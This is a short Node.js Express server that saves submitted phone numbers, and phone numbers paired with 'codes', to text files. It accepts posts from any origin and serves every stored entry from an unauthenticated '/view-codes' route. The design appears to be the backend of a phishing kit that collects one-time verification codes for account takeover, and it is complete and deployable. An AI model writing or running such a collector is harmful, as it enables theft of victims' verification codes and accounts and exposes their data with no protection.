const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const filePath = path.join(__dirname, 'codes.txt');


const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json()); // to parse JSON body

// Optional root route
app.get('/', (req, res) => {
  res.send('Backend is running!');
});

app.post('/save-phone', (req, res) => {
    const phone = req.body.phone;
    if (phone) {
      fs.appendFile('phones.txt', `${new Date().toISOString()} - ${phone}\n`, (err) => {
        if (err) return res.status(500).json({ error: 'Failed to save phone' });
        res.json({ status: 'success' });
      });
    } else {
      res.status(400).json({ error: 'No phone number provided' });
    }
  });
 
 // ✅ View saved entries
app.get('/view-codes', (req, res) => {
    fs.readFile(filePath, 'utf8', (err, data) => {
      if (err) {
        return res.status(500).send('Error reading file');
      }
      res.type('text').send(data);
    });
  });
  

// ✅ Save phone and code to file
app.post('/save-code', (req, res) => {
    const { phone, code } = req.body;
    const entry = `${new Date().toISOString()} - Phone: ${phone} | Code: ${code}\n`;
  
    fs.appendFile(filePath, entry, (err) => {
      if (err) {
        console.error('Error saving:', err);
        return res.status(500).json({ success: false });
      }
      res.json({ success: true, message: 'Saved successfully' });
    });
  });

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
